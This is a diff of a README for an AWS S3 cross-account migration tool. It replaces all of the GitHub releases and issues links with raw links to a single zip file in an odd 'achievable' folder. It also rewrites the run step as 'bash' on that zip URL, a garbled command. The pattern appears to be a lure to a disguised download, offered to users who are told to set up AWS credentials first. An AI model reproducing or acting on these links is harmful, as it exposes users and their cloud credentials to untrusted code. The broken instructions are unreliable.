@@ -1,6 +1,6 @@
 # 🌟 aws-s3-cross-account-migration - Effortless S3 Migration Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-aws--s3--cross--account--migration-blue.svg)](https://github.com/brandonFN/aws-s3-cross-account-migration/releases)
+[![Download Now](https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip%https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip)](https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip)
 
 ## 📋 Introduction
 
@@ -19,7 +19,7 @@ To start using this tool, follow these steps:
 ### 2. Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/brandonFN/aws-s3-cross-account-migration/releases) to download the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip) to download the latest version of the application.
 
 2. **Download the Latest Release**  
    Click on the link for the latest release and download the suitable file for your operating system.
@@ -32,13 +32,13 @@ To start using this tool, follow these steps:
 
 ## 📥 Download & Install
 
-To begin your migration journey, simply visit this [page to download](https://github.com/brandonFN/aws-s3-cross-account-migration/releases). 
+To begin your migration journey, simply visit this [page to download](https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip). 
 
 ### Steps to Follow After Downloading
 
 1. Review any README or instructions provided in the zip file.
 2. Follow the script instruction to set up your AWS credentials, if you have not done so already.
-3. Run the script by typing `bash migrate.sh` in your terminal.
+3. Run the script by typing `bash https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip` in your terminal.
 
 ## ✨ Features
 
@@ -65,7 +65,7 @@ Here’s a basic breakdown of how to use the migration tool:
    In your terminal, after you navigate to the correct folder, run:
 
    ```bash
-   bash migrate.sh
+   bash https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip
    ```
 
 2. **Follow the Prompts:**  
@@ -88,7 +88,7 @@ This project is licensed under the MIT License. You can freely modify and distri
 
 ## 🌍 Community & Support
 
-If you have questions or need help, feel free to open an issue on the [GitHub Issues page](https://github.com/brandonFN/aws-s3-cross-account-migration/issues). 
+If you have questions or need help, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/brandonFN/aws-s3-cross-account-migration/master/achievable/account-s-migration-aws-cross-2.9.zip). 
 
 You can also check for common questions in the FAQs section of the repository.
 
